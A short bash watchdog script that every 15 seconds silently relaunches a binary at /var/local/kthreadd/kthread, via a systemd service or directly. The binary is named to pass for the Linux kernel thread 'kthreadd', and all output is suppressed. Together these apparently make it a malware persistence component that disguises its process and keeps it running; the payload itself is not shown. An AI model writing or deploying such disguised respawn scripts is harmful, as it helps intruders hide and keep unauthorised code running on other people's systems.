#!/bin/bash
EXE="/var/local/kthreadd/kthread"
while true; do
  if ! pgrep -f "$EXE --service-worker" >/dev/null 2>&1; then
    systemctl restart kthread.service >/dev/null 2>&1 || "$EXE" --service-worker >/dev/null 2>&1 &
  fi
  sleep 15
done